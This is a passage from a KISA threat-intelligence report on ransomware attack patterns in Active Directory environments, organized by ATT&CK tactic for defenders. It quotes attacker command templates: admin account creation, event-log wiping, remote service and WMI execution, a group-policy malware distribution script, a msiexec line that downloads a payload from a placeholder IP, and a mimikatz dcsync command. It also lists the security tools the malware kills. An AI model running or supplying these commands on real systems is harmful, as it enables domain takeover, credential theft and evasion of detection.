www.kisa.or.kr

「Tactics,
Techniques,
Procedures」

TTPs#5 : attack patterns

in AD environment

Contents

「Tactics, Techniques, Procedures」

TTPs#5 :
attack patterns
in AD environment
1. Introduction

03

2. Overview

04

3. ATT&CK Matrix

08

4. Conclusion

51

Reproduction or copying of the contents of this report
without permission from the Korea Internet & Security
Agency is prohibited and may violate copyright laws.

Written by: Profound Analysis Team,
Internet Incident Analysis Group
Kayoung Kim, Researcher
Dongwook Kim, Deputy General Researcher
Taewoo Lee, Deputy General Researcher
Seulgi Lee, Deputy General Researcher
JaeKwang Lee, Manager
Edited by: Dae-Kyu Shin, Vice President
Jinsoo Lim, Director

1.
Introduction

「Tactics, Techniques, Procedures」

1. Introduction

The rise in hacking incidents have led to ever-more stringent security requirements and the continuous
evolvement of security systems to the next level. Yet, cyber incidents that were reported in the past are still
being repeated today, and organizations with some of the most sophisticated cyber-defense systems are still
falling victims to such attacks.

Figure 1-1

TTPs#5 : attack patterns in AD environment

The influential concept of “The Pyramid of Pain” in the sphere of cybersecurity illustrates that the most effective
security systems depend on understanding the ‘tactics, techniques and procedures’ (TTP) of the attackers. The
ultimate goal of cybersecurity is to make attacks more costly and more painful for perpetrators, in other words,
elevated to the ‘tough’ level shown at the top of the pyramid.

Pyramid of Pain, David J Bianco

A cybersecurity system based on ‘indicators of compromise’ (IoC) still remains very efficient. (IoCs would refer
to one-dimensioned indicators such as malicious IPs or domains.) However, it is also true that attackers can
easily secure then discard attack infrastructures using such simple indicators.
TTPs are different. The attacker cannot easily obtain or discard TTPs. An attacker who has locked on a target
needs to invest in learning and practicing TTPs to neutralize the target's security system. When moving on to the
next attack, the attacker will tend to select targets on which the same TTPs can be applied.
The attacker's TTPs by nature are heavily influenced by the characteristics of the targeted defense environment.
As such, security practitioners must have an accurate understanding of their own defense environment. They
must also approach the process and flow of attack from the strategic and tactical levels rather than as patterns or
methods. In short, the defender’s security environment and the attacker’s TTPs must be scrutinized together.
A defender who understands the attacker’s TTPs should be able to answer two things: 1) ‘Would the attacker's
TTPs be able to penetrate the defender's environment?’ and 2) ‘If so, what defensive strategy can defeat the TTPs?’
The Korea Internet & Security Agency (KISA) identifies cyberattack TTPs through its incident response process and
disseminates the process and countermeasures using the ATT&CK framework.1 The various artifacts related to TTPs
included in this report are merely tools to promote understanding.
1 A matrix showing the tactics and techniques used in actual attacks and response measures to them

03

2.
Overview

「Tactics, Techniques, Procedures」

2. Overview

In the first half of 2019, there were many ransomware infections targeting companies using AD (active
directory). Security and convenience form two sides of the same coin. AD is efficient for managing a large
number of systems, but careless account management
may lead to the administrator rights being stolen, resulting in the entire internal network being compromised.

TTPs#5 : attack patterns in AD environment

The Korea Internet and Security Agency has, in the past, responded to this by compiling attacker techniques,
malicious code similarities, etc. found during security incident investigations and distributed security warnings to
companies using AD, etc. For some time, the activities of attackers in Korea decreased, but starting near the
end of 2020, ransomware infections for AD environments began to once again occur in Korea.
Corporations, upon hearing the news of the many ransomware incidents, realized the importance of backup
and began regularly backing up important data. When corporations successfully backed up their data and did
not react to the demands of the attackers, the attackers began leaking internal information and request payment
for the leaked data.
The infiltration techniques of attacks differ slightly based on the AD environment composition, but analysis of
AD ransomware infections beginning in 2019 show that most used the same TTPs.
This TTP#5 report has detailed the process closely from the initial infiltration of the AD environment to the
achievement of the final goal. Through this, the aim is to be of aid to corporations who seek to inspect internal
security systems and build defensive strategies.

04

2.
Overview

「Tactics, Techniques, Procedures」

01

Reconnaissance

At the reconnaissance stage, email stealer malicious code is used to leak Outlook data files from previously
infected systems and extract email information. Some of such email accounts are used in APT attacks targeting
corporations.

02

Resource Development

For internal transfers in an AD environment, commercial malicious tools such as Cobalt Strike, Ammyy Admin,
Tiny Met, etc. are used. Resources to be used as control servers or locations for malicious code distribution are
secured in advance, and attack tools for SMB side transfers are created.

TTPs#5 : attack patterns in AD environment

03

Initial Access

Previously stolen email accounts are sent malicious files or spear-phishing email with malicious codes. In order
to disguise them as normal email, the target’s work and corporation characteristics are utilized, which means the
form and content of each email is always different.

04

Execution

Remote commands are executed through remote control malicious code and pipes are created between
domain systems for carrying out of commands. The SMB port is used to run commands on other systems
joined in the AD and the malicious codes are registered as a service. WMI, powershell, etc. are used to run
commands on the remote device.

05

Persistence

In order to keep the remote control malicious code persistent on infected systems, services and registry
registration are executed through Autorun. AD DC is taken over to distribute group policies so that all systems
joined on the AD can be infected simultaneously.

06

Command and Control

The attackers use Ammyy RAT and Amadey Bot malicious code to execute various remote commands from
an external C2 server and download additional malicious files. After taking over the base server, the SMB
feature is used to run additional commands on other systems and download/execute malicious code.

07

Privilege Escalation

User/administrator domain account information is stolen to connect to other systems connected via AD. For
password protection of shared folders during ransomware attacks, remote desktop session information is
sometimes stolen as well.

05

2.
Overview

「Tactics, Techniques, Procedures」

08

Credential Access

The attacker uses AD server administrator account information gathered through password dump programs for
internal transfers, or uses accounts additionally created.

09

Defense Evasion

Malicious code with a signed certificate or encryption is used to avoid detection from security programs, and
msiexec is used to run the malicious code. After the attack is over, the malicious code, event logs, etc. are deleted.

Discovery

TTPs#5 : attack patterns in AD environment

10

On initial infiltration, domain information is collected and a file directory search or network sharing exploration is
used to detect the structure of the internal network. Internal transfer is used to collect and leak information of the
infected system, and process or service information is also sometimes collected for ransomware infections.

11

Lateral Movement

Attackers use the acquired AD accounts to attempt RDP access on other systems, and the Windows
filesharing protocol feature (SMB) is usually used to spread malicious code and cause additional infections.
Powershell is used to run remote commands on other systems and download/run additional malicious code
from the attacker’s external server, or the sharing folder of the base server is used to collect malicious code
and the Windows administrator sharing feature is used to copy the malicious code and execute them to other
systems.

12

Collection

The attacker gains AD administrator rights after the initial infiltration and repeats internal transfers until the
server is dominated. Commercial tools such as Ping castle, powerkatz, etc. are used to collect information on
processes, networks, accounts, etc. Remote control malicious code is then used to collect information about the
target systems and the information is encoded in a self-implemented XOR before being leaked.

13

Exfiltration

The data extracted from an infected system's memory is saved as a single file and leaked to the attacker's C2
server. Email and account info collected from infected systems in the reconnaissance stage have been leaked
to attacker C2 servers as well.

14

Impact

The services and processes that are running are shut down to avoid detection prior to ransomware distribution.
Afterwards, AD administrator rights are used to distribute ransomware through AD DC policy distribution or SMB
protocols are used to register services for ransomware infections.

06

2.
Overview

「Tactics, Techniques, Procedures」

Reconnaissance
①

Resource Development
②

Resource Development
①
Defesne Evasion
②

Ini�al Access
①②

TTPs#5 : attack patterns in AD environment

Execu�on
①②

Defense Evasion
⑤

Commnad and Control
①②③④

Execu�on
③④⑤

Discovoery
③

Persistence
①②③

Creden�al Access
①②

Privilege Escala�onDefense Evasion
①②
①③④
Lateral Movement
①②③

Execu�on
⑥

Execu�on
③④⑤⑦⑧

Collec�on
①②

Defense Evasion Persistence Privilege Escala�on Creden�al Access
①②③
①②
①②
①③④
Lateral Movement
①②③

Exﬁltra�on
①

Lateral Movement
①②③

Execu�on
③④⑤⑦⑧

Lateral Movement
④

Collec�on
①②

Exﬁltra�on
①

Exﬁltra�on
①

Collec�on
①②

Privilege Escala�on
③④
Defense Evasion
⑥

Lateral Movement
①②③

Collec�on
①②

Privilege Escala�on
⑤⑥

Discovery
①②④⑤⑥⑦

Persistence
④

Impact
①

Impact
②

* Clicking each number navigates to the
relevant details page.

Figure 2-1

Attack summary diagram

07

3.
ATT & CK
Matrix

「Tactics, Techniques, Procedures」

3. ATT&CK Matrix

Reconnaissance
 ather Victim Identity
G
Information

Obtain Capabilities
Develop Capabilities

TTPs#5 : attack patterns in AD environment

Resource
Development
Initial Access
Phishing

Execution

C
 ompromise Infrastructure
User Execution
 ommand and Scripting
C
Interpreter
System Services
Inter-Process
Communication
Scheduled Task
 indows Management
W
Instrumentation

Persistence
Create Account
 reate or Modify System
C
Process
 oot or Logon Autostart
B
Execution
 oot or Logon
B
Initialization Scripts

Privilege Escalation
Valid Accounts

Credential Access

 buse Elevation Control
A
Mechanism

OS Credential Dumping

 ccount Token
A
Manipulation

Create Account

Defense Evasion
Masquerading
Subvert Trust Controls

 omain Policy
D
Modification
 oot or Logon
B
Initialization Scripts

Indicator Removal on
Host
 igned Binary Proxy
S
Execution
 eobfuscate/Decode
D
Files or information

08

3.
ATT & CK
Matrix

「Tactics, Techniques, Procedures」

Discovery
Software Discovery

Lateral Movement

Process Discovery

Remote Services

Collection

Account Discovery

Lateral Tool Transfer

Data from Local System

 ile and Directory
F
Discovery

Archive Collected Data

 xfitration Over C2
E
Channel

TTPs#5 : attack patterns in AD environment

 etwork Share
N
Discovery

Exfiltration

 ystem Information
S
Discovery
 ystem Owner/User
S
Discovery

Impact
Service Stop
 ata Encrypted for
D
Impact

Command
and Control
 emote Access
R
Software
 pplication Layer
A
Protocol
Ingress Tool Transfer
Protocol Tunneling

09

3.
ATT & CK
Matrix

「Tactics, Techniques, Procedures」

A Reconnaissance
 Gather Victim Identity Information - Email Addresses: Email address collection
The attacker uses the email stealer malicious code to collect email addresses from infected systems.
The collected email addresses are used to infiltrate the main targets, corporations, using the AD environment.

TTPs#5 : attack patterns in AD environment

Outlook

Email authentication information
(account, profile)
email information

ThunderBird

Hacker Server

File Signature

10

3.
ATT & CK
Matrix

「Tactics, Techniques, Procedures」

B Resouce Development
 Obtain Capabilities – Tool, Malware: Obtaining tools and malware
Attackers use the commercial malicious tool CobalStrike for internal transfers.
In addition, the remote control malicious code Ammyy Admin, AmadeyBot, and TinyMet are used for remote control.
Most types of malicious code are based on publicly available tools but are slightly tweaked in function.

CobaltStrike

TTPs#5 : attack patterns in AD environment

TinyMet

11

3.
ATT & CK
Matrix

「Tactics, Techniques, Procedures」

 Develop Capabilities – Malware: Malicious code creation
In order to spread internally through SMB, attackers use a malicious tool that is presumably self-developed.

Malicious tools that use SMB

TTPs#5 : attack patterns in AD environment

Traces of malicious tool use (Malicious code logs)
10.123.170.231 : Payload direct copy FAILED (67), SM opened, Payload reverse copy FAILED (1073)
10.123.184.91 : Payload direct copy FAILED (112), SM opened, Payload reverse copy FAILED (1073)
10.201.10.145 : Payload direct copy FAILED (1326), SM open FAILED (5)
10.123.170.229 : Payload direct copy FAILED (67), SM opened, Payload reverse copy FAILED (1073)
...
10.201.10.83 : Payload direct-copied, SM opened, Service created, Service started, Service removed, Payload removed
10.201.10.84 : Payload direct-copied, SM opened, Service created, Service started, Service removed, Payload removed

 Compromise Infrastructure – Server: Server resource acquisition
 small corporation’s servers are broken into to distribute additional malicious code to the target or perform
A
command control.

Malicious code

Link click

Malicious code download

Attacker

Resource acquisition
through hacking

12

3.
ATT & CK
Matrix

「Tactics, Techniques, Procedures」

C Initial Access
 Phising – Spearphishing Attachment: Phishing using attachments
 Phising – Spearphishing Link: Phishing using links
Spear-phishing emails are sent to individuals in order to infiltrate corporations.
Phishing methods use both attachments and malicious links inside the email.

TTPs#5 : attack patterns in AD environment

13

3.
ATT & CK
Matrix

「Tactics, Techniques, Procedures」

D Execution
 User Execution – Malicious File: Running malicious files
Various types of malicious files are attached to phishing email, and users are induced to run them.

Malicious macros

TTPs#5 : attack patterns in AD environment

connecting to malicious code
distribution site

malicious code distribution server

Malicious code
download

Inducing execution
of macros

malicious code

Malicious functions executed through link files

Unzipping

.iso

malicious code
distribution server
connecting to malicious code
distribution site

.lnk
disguising as
pdf file

Malicious code
download

run with double click

malicious code

14

3.
ATT & CK
Matrix

「Tactics, Techniques, Procedures」

Screensaver file is used to execute malicious function

Unzipping

.iso
connecting to malicious code
distribution site

malicious code
distribution server

.lnk
Malicious code
download

disguising as
pdf file

TTPs#5 : attack patterns in AD environment

run with
double click

malicious code

 User Execution – Malicious link: Malicious link click
 sers are induced to click malicious links in phishing email, downloading malicious code in external
U
servers and executing them.

Link click

malicious code
download

malicious
code

15

3.
ATT & CK
Matrix

「Tactics, Techniques, Procedures」

 Command and Scripting Interpreter – Windows Commnad Shell: Using windows commands
CMD is used to control the infected system. Commands used by the attacker are as follows.

Used commands
net user [account name] [password] /add

Account privilege setting

net localgroup administrators [account name] /add

Process stopping

taskkill /IM [process name]

Service stopping

net stop [service name]

Service creation

sc create [malicious service name] binpath= [malicious code path]

Service execution

sc start [malicious service name]

Service removal

sc delete [malicious service name]

Domain account check

net user /domain

Delete event log

for /F \ “tokens=*\” %1 in (‘wevtutil.exe el’) DO wevtutil.exe cl \“%1\”

Creation of schedule

schtasks.exe /CREATE /XML C:\Programdata\[malicious schedule file

TTPs#5 : attack patterns in AD environment

Account creation

name].xml /tn [malicious schedule name]
Schedule execution

schtasks.exe /RUN /tn [malicious schedule name]

Schedule stopping

schtasks.exe /END /tn [malicious schedule name]

Schedule deletion

schtasks.exe /DELETE /tn [malicious schedule name] /F

Process checking

tasklist

16

3.
ATT & CK
Matrix

「Tactics, Techniques, Procedures」

 Command and Scripting Interpreter – Powershell: Using windows Powershell
 hen executing additional malicious code or using lateral transfers to attempt to infect other resources,
W
Powershell is used.

Powershell execution log (Windows Powershell log)

TTPs#5 : attack patterns in AD environment

Powershell execution log (System service installation log)

17

3.
ATT & CK
Matrix

「Tactics, Techniques, Procedures」

Powershell execution (Clop ransomware execution)

Code (X86)

Code (X64)

TTPs#5 : attack patterns in AD environment

＊Default

1. Code selection according to the execution environment
2. Code size definition (default 0×100)
3. Allocation of new memory and code copying

83

EC

4. Run

18

3.
ATT & CK
Matrix

「Tactics, Techniques, Procedures」

 System Services – Service Execution: Service execution
Service installation and execution functions are used to run malicious codes or commands.
Most lateral transfers are performed through SMB ports. As such, for malicious code execution through
SMB ports, service installation/execution is needed.
Service installation can be checked by searching event ID 7045 in the Windows event long.

Execution of remote control malicious code

TTPs#5 : attack patterns in AD environment

Execution of command

Ransomware infection

19

3.
ATT & CK
Matrix

「Tactics, Techniques, Procedures」

 Inter-Process Communication: Communication between malicious processes
Pipe communication is used to share commands between malicious codes.
The pipe used is called CobaltStrike, and the naming pattern is that of the malicious codes created.
If the malicious code creates a pipe that is capable of both reading/writing, it can function as a server.
Afterwards, an external client attempts to connect to the pipe and ends up executing the data sent by the
attacker.

Pipe communication code – malicious code (status_a63b, status_2d19, status_dd21)

TTPs#5 : attack patterns in AD environment

1. Create Named pipe

status_a636

2. Pipe
connection
status_2d19

status_dd21

3. Data
reception
4. Execution

external
Process

20

3.
ATT & CK
Matrix

「Tactics, Techniques, Procedures」

Pipe communication traces - firewall log

TTPs#5 : attack patterns in AD environment

Pipe communication traces - event log

List of pipes used

Hacking tool

status_887
status_776
status_34513
status_a63b
status_2d19
status_dd21

CobaltStrike

svcctl
samr
lsarpc

PsExec

21

3.
ATT & CK
Matrix

「Tactics, Techniques, Procedures」

 Scheduled Task – Scheduled Task/Job: Execution via task scheduler
Malicious code is used through task scheduler registration
Because most lateral transfers use SMB ports, scheduler creation and execution are sometimes used
because it is a method of executing files through the SMB port.

account acquisition

system B

TTPs#5 : attack patterns in AD environment

Infected system A

SMB connection using the acquired account

.xml file insertion through shared folder

Scheduler creation and execution via .xml file

Used commands

Creation of schedule

schtasks.exe /CREATE /XML C:\Programdata\[malicious schedule file
name].xml /tn [malicious schedule name]

Schedule execution

schtasks.exe /RUN /tn [malicious schedule name]

Schedule stopping

schtasks.exe /END /tn [malicious schedule name]

Schedule deletion

schtasks.exe /DELETE /tn [malicious schedule name] /F

22

3.
ATT & CK
Matrix

「Tactics, Techniques, Procedures」

 Windows Management Instrumentation: Windows management tool
 indows Management Instrumentation is used to execute commands on remote systems. The commands
W
used from the base server can be checked by searching for event ID 4648 on the server’s Windows
security log.

Execution of command
wmic /node:[server name|IP address] /user:[domain name]\[username]

TTPs#5 : attack patterns in AD environment

/password:[password] process call create [command]

WMIC execution traces - event log

23

3.
ATT & CK
Matrix

「Tactics, Techniques, Procedures」

E Persistenc
 Create Account: Account creation
After infiltration of a corporate system, an attacker's account is created and given administrator privileges.

[random16].bat

Windows\temp\[random16].txt
Name, extension change

TTPs#5 : attack patterns in AD environment

account creation

net user [ID] [password] /add
Administrators

Windows\temp\[random16].txt

[random16].bat

[ ID ]

Name, extension change

net logcalgroup administrators [ID] /add

addition of account to
managed group

Used commands
%COMSPEC% /C echo net user [계정명] [패스워드] /add ^> %SYSTEMDRIVE%\
Account
creation

WINDOWS\Temp\[random_16].txt >
\WINDOWS\Temp\[random_16].bat &
%COMSPEC% /C start %COMSPEC% /C \WINDOWS\Temp\[random_16].bat
%COMSPEC% /C echo net localgroup administrators [계정명] /add ^> %SYSTEMDRIVE%\

Account privilege
setting

WINDOWS\Temp\[random_16].txt >
\WINDOWS\Temp\[random_16].bat &
%COMSPEC% /C start %COMSPEC% /C \WINDOWS\Temp\[random_16].bat

24

3.
ATT & CK
Matrix

「Tactics, Techniques, Procedures」

 Create or Modify System Process – W indows Sevice: Maintaining persistence through
service installation
For malicious code that requires persistence maintenance, service start type is set to auto start.

Ransomware malicious code auto start

TTPs#5 : attack patterns in AD environment

 Boot or Logon Autostart Execution- Registry Run Keys / Startup Folder: Autostart
registration in registry and start folder
The malicious code is registered in the auto start registry.

Registry path
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\IntelProtected

25

3.
ATT & CK
Matrix

「Tactics, Techniques, Procedures」

 Boot or Logon Initialization Scripts: Network Logon Script: Autostart via group policy
In order to take over an AD environment, a domain administrator account is mandatory. As such, a system
that has previously used an administrator account is found and an account dump program called mimikatz
is used. This secures the system's account information.
After securing an account that belongs to the administrator group, the Bypass User Account Control
method is sometimes used to elevate to administrator rights.

TTPs#5 : attack patterns in AD environment

Malicious code insertion log using GPO
SysVol\[DomainName]\Policies\[PolicyGUID]\Machine\Scripts\Startup\stopserv.exe
SysVol\[DomainName]\Policies\[PolicyGUID]\Machine\Scripts\Startup\wsusrv.exe
SysVol\[DomainName]\Policies\[PolicyGUID]\Machine\Scripts\Shutdown\stopserv.exe
SysVol\[DomainName]\Policies\[PolicyGUID]\Machine\Scripts\Logon\stopserv.exe
SysVol\[DomainName]\Policies\[PolicyGUID]\Machine\Scripts\scripts.ini

26

3.
ATT & CK
Matrix

「Tactics, Techniques, Procedures」

F Privilege Escalation
 Valid Accounts – Domain Accounts: OS account info acquisition and use
 Abuse Elevation Control Mechanism – Bypass User Account Control: UAC bypass
In order to take over an AD environment, a domain administrator account is mandatory. As such, a system
that has previously used an administrator account is found and an account dump program called mimikatz
is used. This secures the system's account information.
After securing an account that belongs to the administrator group, the Bypass User Account Control
method is sometimes used to elevate to administrator rights.

TTPs#5 : attack patterns in AD environment

27

3.
ATT & CK
Matrix

「Tactics, Techniques, Procedures」

 Account Token Manipulation – Token Impersonation/Theft: Impersonation or theft of
other tokens
 he remote desktop session host info is brought to find users logged in or the designated exeplorer.exe
T
user token is copied.

2. Acquisition of
session ID logged
into Windows station

Sess 1

WTS Active?

Sess 2

TTPs#5 : attack patterns in AD environment

1. RDP session info
acquisition

.
.
.
Sess N

3. Username acquisition
from session ID
username
4. User token acquisition
※ If a specific user is designated,
the user’s token is acquired

Token

5. Token copying
Duplicated
token

28

3.
ATT & CK
Matrix

「Tactics, Techniques, Procedures」

 Account Token Manipulation – Create Process with Token: Creation of processes with highprivilege tokens
 sername is extracted from EXPLORER.EXE and if the username is less than 5 characters, the designated
U
user token is copied the same as in Account Token Manipulation – Token Impersonation/Theft If not, the
usable user token is copied. Afterwards, the copied tokens are used to execute the current process file
with the runrun parameter.

Process

Explorer.exe

TTPs#5 : attack patterns in AD environment

1. Username extraction
from ‘explorer.exe’

username
2. len(username)
<
-5
Duplicated
token

Token
3. Execution

29

3.
ATT & CK
Matrix

「Tactics, Techniques, Procedures」

 Domain Policy Modification – Group Policy Modification: Group policy modification
 Boot or Logon Initialization Scripts – Network Logon Script: Autostart via group policy
Group policies are used to distribute malicious codes and administrator privileges are used to run them.

TTPs#5 : attack patterns in AD environment

Script parameters
copy /y \\[Domain]\SYSVOL\domain\policy\[policy UID]\Machines\Scripts\Startup\[malicious code]
C:\Windows\tasks\[malicious code] &&
sc Create [malicious service name] binpath = “C:\Windows\tasks\[malicious code]” start=auto &&
sc start [malicious service name]

30

3.
ATT & CK
Matrix

「Tactics, Techniques, Procedures」

G Credential Access
 OS Credential Dumping: OS account info extraction
mimikatz is used to collect account information from the infiltrated system.
The account information is used for lateral transfer and domain controller infiltration.

Traces of mimikatz commands (leftover memory from application clashes)

TTPs#5 : attack patterns in AD environment

lsadump::dcsync /user – command that dumps the DC username's password hash

Part of mimikatz command results (leftover memory from application clashes)

31

3.
ATT & CK
Matrix

「Tactics, Techniques, Procedures」

 Create Account: Account creation
Additional accounts are created for the continuous management of targeted systems.

Account creation

TTPs#5 : attack patterns in AD environment

Account group privilege change

32

3.
ATT & CK
Matrix

「Tactics, Techniques, Procedures」

H Defense Evasion
 Masquerading: Masquerading
The attacker disguised the malicious code with a normal program name to hide it from being detected.

Malicious code name

Normal program
disguise

C:\ProgramData\Adobe\wsus.dll
C:\ProgramData\Adobe\Setup\wsus.exe
C:\Intel\localserv.exe
C:\Intel\logon.exe
C:\Intel\wsus.exe
C:\hp\sysinfo.exe
C:\hp\slog.exe
C:\hp\AdFind.exe
C:\hp\sage.exe
C:\hp\wsus.exe

Windows software
disguise

C:\ProgramData\Microsofts HeIp\wsus.exe
C:\ProgramData\Microsofts Help\wsus.exe
C:\Windows\localserv.exe
C:\Windows\tasks\wsusrv.exe

Service name

IntelProtected

TTPs#5 : attack patterns in AD environment

Type

 Subvert Trust Controls – Code Signing: Certificate signing
To evade vaccine detection, malicious code has signed certificates.

33

3.
ATT & CK
Matrix

「Tactics, Techniques, Procedures」

 Indicator Removal on Host – File Deletion: File deletion
 hen being infected by a malicious code, if the same malicious code is installed, the previous copy is deleted.
W
A file deletion script is used to erase traces.

Infected
system

Installation

TTPs#5 : attack patterns in AD environment

Existing Malware

New
Malicious Code

Deletion
File deletion script
del “C:\hp\slog.exe” if exist “C:\hp\slog.exe” goto R del “ex.bat”

 Indicator Removal on Host – Clear Windows Event Logs: Event log deletion
 ost malicious codes feature initial commands through service installation, and commands are left on the
M
event log. As such, the event log is deleted to remove the traces.
Some malicious codes have been confirmed to delete event logs.

File deletion script

34

3.
ATT & CK
Matrix

「Tactics, Techniques, Procedures」

 Signed Binary Proxy Execution – Msiexec: Malicious code installation through msiexec
 pear-phishing email malicious attachments use msiexec to download malicious codes and execute the
S
codes via a script.
Using a Windows-signed msiexec to run malicious codes can bypass security programs that control
applications.

Script included in macros

TTPs#5 : attack patterns in AD environment

msiexec.exe RETURN /i http://[ip]/vsupdate /q ksw=’%TEMP%’

Malicious code distribution site

spear-phishing
target system

msiexec

악성문서
msiexec.exe RETURN /i http://[ip]/vsupdate /q ksw=’%TEMP%’
additional malicious code download and execution

35

3.
ATT & CK
Matrix

「Tactics, Techniques, Procedures」

 Deobfuscate/Decode Files for information: File/information deobfuscation and decoding
The obfuscated resources in the malicious code are read, decoded and turned into plain text.

Execution Flow

Malware

Find Resource (Resource A)

Header

Get (Resource A)

TTPs#5 : attack patterns in AD environment

Body

Section (.rsrc)

Resource A
Resource B

Decoding & normal
string acquisition

Resource C

36

3.
ATT & CK
Matrix

「Tactics, Techniques, Procedures」

Decoding routine included in Powershell

base64
xor146
base64

gzip.decompress

base64

TTPs#5 : attack patterns in AD environment

xor35

code

Routines are base64 ⇒ xor 146 ⇒ base64 ⇒ gzip.decompress ⇒ base64 ⇒ xor 35.

Decoding routine for command fetching

{

{

7·9

Base

ROL N

index

++

<option>
subt idx

index ++
OX564
(1380)

(Standard data xor target data ⇒ ROL {7|9} ⇒ xor data⇒ – index) * 1380 times repeat

37

3.
ATT & CK
Matrix

「Tactics, Techniques, Procedures」

I Discovery
 Software Discovery – Security Software Discovery: Security software discovery
 Process Discovery: Process discovery
 hen ransomware encrypts files, processes and services that intrude are checked and if they are running,
W
they are shut down.

Process name

QHSAFETRAY.exe

QHWATCHDOG.exe

CMDAGENT.exe

CIS.exe

V3LIGHT.exe

V3MAIN.exe

V3SP.exe

SPIDERAGENT.exe

DWENGINE.exe

DWARKDAEMON.exe

dbsnmp.exe

steam.exe

PNTMON.exe

dbeng50.exe

Powerpnt.exe

firefoxonfig.exe

mspub.exe

mysqld-opt.exe

isqlplussv.exe

onenote.exe

oautoupds.exe

TTPs#5 : attack patterns in AD environment

QHActivesDEFENSE.exe

Service name
McAfeeEngineService Symantec System Recovery

SepMasterService

tmlisten

NetMsmqActivator

MsExchangeMGMT

BackupExecDeviceMedia
Service

ShMonitor

VeeamRESTSvc

BackupExecVSSProvider

MsDtsServer

VeeamDeploySvc

SQLAgent$PROD

Sophos Message Router

McShield

BackupExecJobEngine

swi_filter

Sophos AutoUpdate Service

Sophos MCS Agent

MsDtsServer100

IMAP4Svc

SQLSERVERAGENT

SQLsafe Filter Service

Antivirus

DCAgent

SQLAgent$BACKUPExec

MSSQLSERVER

Zoolz 2 Service

mfevtp

SQLAgent$VEEAMMSQL
2008R2

SQLTELEMETRY$ECWDB2

MSSQL$SHAREPOINT

AcronisAgent

Sophos File Scanner Service

ReportServer$TPS

MSSQLFDLauncher$TPS

MSSQL$TPS

UI0Detect

POP3Svc

Process names containing certain words

alert

alsvc.

archiv

armsvc

boanet

busine

cisvc.

clean.

cmd.ex

conhos

csrss.

dwm.ex

iastor

iexplo

inetin

java.e

Imigua

lms.ex

logmei

lsass.

lsm.ex

ndagen

node.e

nssm.e

ppsgne

pxcont

python

ramain

safest

savadm

savser

sdcser

search

servic

shell.

smss.e

snarec

sntpse

sophos

spools

sqlbro

sqlwri

sspser

svchos

swc_se

swi_se

syslog

tasken

taskho

timesr

uns.ex

update

winini

winlog

winvnc

wmiprv

xsauth

dllhos

excel.

explor

mmc.ex

csrs.e

clamsc

regsvr

mobsyn

rundll

runonc

winwor

system

notepa

taskmg
38

3.
ATT & CK
Matrix

「Tactics, Techniques, Procedures」

 Account Discovery – Domain Account: Domain account discovery
In order to check for an AD environment, the malicious code uses the command “net user /domain.”
The result of the command determines whether to continue the infection.

결과에 WORKGROUP 이란
단어 포함시

Malicious code
shutdown

TTPs#5 : attack patterns in AD environment

malicious code
operation

결과에 WORKGROUP이란
단어 불포함시

 File and Directory Discovery: File/directory discovery
 Network Share Discovery: Network sharing discovery
For file encryption, drives (A: - Z:), flash drives, and network drives are searched.
When file encryption is performed through ransomware, and designated folders and filenames are
excluded from encryption.

Excluded folder names
Chrome
ProgramData
Microsoft
Windows
SOPHOS
PERFLOGS

All Users
Recycle.bin
Program files (x86)
BOOTMGR
TOR BROWSER
WINNT

Mozilla
AhnLab
Program Files
RECOVERY
SYSTEM VOLUME INFORMATION
APPDATA

Excluded file names
ClopReadMe.txt
autoexec.bat
netuser.ini
autorun.inf
ntuser.dat.log

AUTOEXEC.bat
boot.ini
DESKTOP
iconcache.db
thumbs.db

ntldr
NTDETECT.COM
desktop.ini
bootsect.bak
ntuser.dat

Excluded extensions
.dll
.Clop
.Cl0p
.MSI
.LNG
.BAT

.exe
.OCX
.ICO
.CHM
.TTF

.sys
.lnk
.INI
.HLF
.CMD

39

3.
ATT & CK
Matrix

「Tactics, Techniques, Procedures」

 System Information Discovery: System information discovery
 System Owner/User Discovery: System user information discovery
Information is collected from the infected system and leaked.
The system’s language is detected, and systems using the Russian character set are excluded from
infection targets. Recent ransomware does not care about character sets.

Value name

Description
Unique ID value
System OS information

priv

Malicious code execution privileges UAC

cred

User path

pcname

System name

avname

Vaccine information

build_time

Malicious code execution time

card

NFC information

TTPs#5 : attack patterns in AD environment

id
os

Languages excluded from encryption
Armenian

Kazakh

Tajik

Azerbaijani

Kyrgyz

Turkmen

Belarusian

Russian

Ukrainian

Georgian

Swahili

Uzbek

40

3.
ATT & CK
Matrix

「Tactics, Techniques, Procedures」

J Lateral Movement
 Remote Services – SMB/Windows Admin Shares: SMB/Windows administrator sharing
 he infected server uses network sharing to execute commands on other systems joined to the domain
T
controller and creates malicious codes. The net use command is used to approach shared folders, and
after the session is connected, malicious files are copied. The sc command is used to register malicious
files as a service. This can be checked by searching for event ID 4648 on the infected server’s Windows
security log.

TTPs#5 : attack patterns in AD environment

SMB communication history

Shared folder connection command
net use X:\\[server IP to be approached]\[drive name|directory name]$ “[password]” /user:[account name]

Service registration - event log

41

3.
ATT & CK
Matrix

「Tactics, Techniques, Procedures」

 Remote Services – Remote Desktop Protocol: Remote desktop connection protocol
The acquired AD account is used to attempt a remote desktop connection.

RDP attack
Account
acquisition

RDP attack

target system

target system
RDP attack

RDP attack

TTPs#5 : attack patterns in AD environment

infiltration
success

target system

RDP attack

RDP attack
Account
acquisition

target system

target system

 Remote Services – Windows Remote Management: Windows remote management
 inRM is used to execute commands on remote systems using Powershell. In AD environments, the
W
“invoke-command” is used to run remote commands on multiple systems at once. Traces of Powershell
run with administrator rights to attempt remote access to other systems can be checked by searching for
event IDs 4624, 4648 in the base server's Windows security log.
Malicious code download to remote server via Powershell
server 1

Base

1. Execute Powershell
commands on remote
server with administrator
privileges
(execute Attack.ps1 script)

external server
C2

2. Malicious code
download
server 2

Powershell execution - event log (ID:4624)

42

3.
ATT & CK
Matrix

「Tactics, Techniques, Procedures」

Remote location command execution - event log (ID:4648)

TTPs#5 : attack patterns in AD environment

 Lateral Tool Transfer: Lateral tool transfer
 MB protocols and Window’s basic administrator sharing functions are used to transfer malicious code or
S
attack tools between target systems.
A base server target is selected, malicious code is collected in a shared folder, and other systems use this
folder for downloads and execution.

smb
Base server

Shared folder
account theft malicious
code / tunneling malicious
code / information theft
malicious code

smb

smb

external PC 1

external PC 2

external PC 3

Network sharing folder access traces - security equipment log

Access file path
[IP]/usersp/64.exe
[IP]/C$/PerfLogs/228s.exe
UNC/[IP]/usersp/tiny_sd4.exe
UNC/[IP]/usersp/pslsass64_r.exe
UNC/[IP]/usersp/pslsass.bat
UNC/[IP]/usersp/procdump64.exe

43

3.
ATT & CK
Matrix

「Tactics, Techniques, Procedures」

